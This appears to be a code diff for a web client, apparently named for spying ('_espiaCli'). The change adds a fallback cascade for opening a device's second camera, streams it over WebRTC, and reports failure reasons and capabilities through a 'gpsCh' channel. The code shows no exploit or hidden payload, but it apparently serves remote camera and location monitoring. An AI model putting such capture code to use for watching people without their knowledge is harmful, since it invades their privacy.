@@ -10993,32 +10993,78 @@
                         pc.addTrack(t, _espiaCli.streams.userMedia);
                     });
                 }
-                // [v2.7.35 DUAL CAMERA] Intentar abrir la 2da cámara si existe
+                // [v2.7.43 DUAL CAMERA REVISITED] Cascada robusta de intentos
                 (async () => {
+                    const setMotivo = (motivo) => {
+                        if (_espiaCli?._capsState) {
+                            _espiaCli._capsState.dualIntentado = true;
+                            _espiaCli._capsState.dualFallReason = motivo;
+                        }
+                        _espiaCli?._enviarCapabilities?.();
+                    };
+                    const tryGUM = async (constraint, desc) => {
+                        try {
+                            const s = await navigator.mediaDevices.getUserMedia({ video: constraint });
+                            console.log('[espia] dual-cam ✓ ' + desc);
+                            return s;
+                        } catch(e) {
+                            console.warn('[espia] dual-cam ✗ ' + desc + ':', e.name, '·', e.message);
+                            return null;
+                        }
+                    };
                     try {
                         const devs = await navigator.mediaDevices.enumerateDevices();
                         const cams = devs.filter(d => d.kind === 'videoinput');
+                        const camsValidas = cams.filter(c => c.deviceId);
                         if (_espiaCli?._capsState) _espiaCli._capsState.camsHardware = cams.length;
-                        if (cams.length < 2) {
-                            console.log('[espia] dual-cam: 1 sola cámara hardware · skip');
-                            if (_espiaCli?._capsState) _espiaCli._capsState.dualIntentado = true;
-                            _espiaCli?._enviarCapabilities?.();
-                            return;
-                        }
+                        if (cams.length < 2) return setMotivo('hardware_single_cam');
+
                         const tUsado = _espiaCli?.streams?.userMedia?.getVideoTracks?.()[0];
-                        const idUsado = tUsado?.getSettings?.()?.deviceId;
-                        const otra = cams.find(c => c.deviceId && c.deviceId !== idUsado);
-                        if (!otra) {
-                            if (_espiaCli?._capsState) _espiaCli._capsState.dualIntentado = true;
-                            _espiaCli?._enviarCapabilities?.();
-                            return;
+                        const settings = tUsado?.getSettings?.() || {};
+                        const idUsado = settings.deviceId;
+                        const facingUsado = settings.facingMode;
+                        const facingOpuesto = facingUsado === 'environment' ? 'user'
+                                            : facingUsado === 'user' ? 'environment'
+                                            : null;
+                        console.log('[espia] dual-cam · primaria facingMode=' + (facingUsado || '?') +
+                                    ' · hardware=' + cams.length + ' · con deviceId=' + camsValidas.length);
+
+                        let stream2 = null, exitoVia = '';
+                        const otra = camsValidas.find(c => c.deviceId !== idUsado);
+                        if (otra) {
+                            stream2 = await tryGUM(
+                                { deviceId: { exact: otra.deviceId }, width:{ideal:640}, height:{ideal:480} },
+                                'deviceId exact (' + (otra.label || 'sin label') + ')'
+                            );
+                            if (stream2) exitoVia = 'deviceId';
                         }
-                        const stream2 = await navigator.mediaDevices.getUserMedia({
-                            video: { deviceId: { exact: otra.deviceId }, width:{ideal:640}, height:{ideal:480} }
-                        });
+                        if (!stream2 && facingOpuesto) {
+                            stream2 = await tryGUM(
+                                { facingMode: { exact: facingOpuesto }, width:{ideal:640}, height:{ideal:480} },
+                                'facingMode exact ' + facingOpuesto
+                            );
+                            if (stream2) exitoVia = 'facingMode_exact';
+                        }
+                        if (!stream2 && facingOpuesto) {
+                            stream2 = await tryGUM(
+                                { facingMode: facingOpuesto, width:{ideal:640}, height:{ideal:480} },
+                                'facingMode ideal ' + facingOpuesto
+                            );
+                            if (stream2) exitoVia = 'facingMode_ideal';
+                        }
+                        if (!stream2) {
+                            let motivo = camsValidas.length < 2 ? 'deviceids_opacos' : 'browser_no_permite_concurrent';
+                            return setMotivo(motivo);
+                        }
                         if (!_espiaCli) {
                             stream2.getTracks().forEach(t => { try{t.stop();}catch(_){} });
                             return;
+                        }
+                        const idNuevo = stream2.getVideoTracks()[0]?.getSettings?.()?.deviceId;
+                        if (idNuevo && idNuevo === idUsado) {
+                            console.warn('[espia] dual-cam: browser devolvió la MISMA cámara · descartando');
+                            stream2.getTracks().forEach(t => { try{t.stop();}catch(_){} });
+                            return setMotivo('browser_devolvio_misma_cam');
                         }
                         _espiaCli.streams.userMedia2 = stream2;
                         _espiaCli._trackTipoMap = _espiaCli._trackTipoMap || {};
@@ -11027,14 +11073,16 @@
                             _espiaCli._trackTipoMap[t.id] = 'camara2';
                             pc.addTrack(t, stream2);
                         });
-                        console.log('[espia] 2da cámara agregada · reneg disparará');
-                        if (_espiaCli?._capsState) _espiaCli._capsState.dualIntentado = true;
+                        console.log('[espia] 2da cámara agregada vía ' + exitoVia + ' · reneg disparará');
+                        if (_espiaCli?._capsState) {
+                            _espiaCli._capsState.dualIntentado = true;
+                            _espiaCli._capsState.dualFallReason = null;
+                        }
                         _espiaCli?._enviarTrackMap?.();
                         _espiaCli?._enviarCapabilities?.();
                     } catch(e) {
-                        console.warn('[espia] 2da cámara fallo:', e.message);
-                        if (_espiaCli?._capsState) _espiaCli._capsState.dualIntentado = true;
-                        _espiaCli?._enviarCapabilities?.();
+                        console.warn('[espia] dual-cam excepción global:', e.name, e.message);
+                        return setMotivo('excepcion:' + e.name);
                     }
                 })();
                 // [v2.7.30 REFACTOR] Handler de reneg: solo SUBE la oferta.
@@ -11167,6 +11215,7 @@
                             camsHardware,
                             camsAbiertas,
                             dualIntentado: _espiaCli._capsState.dualIntentado,
+                            dualFallReason: _espiaCli._capsState.dualFallReason,
                             touchPoints:   navigator.maxTouchPoints || 0
                         };
                         _espiaCli.gpsCh.send(JSON.stringify({ __meta: 'capabilities', caps }));
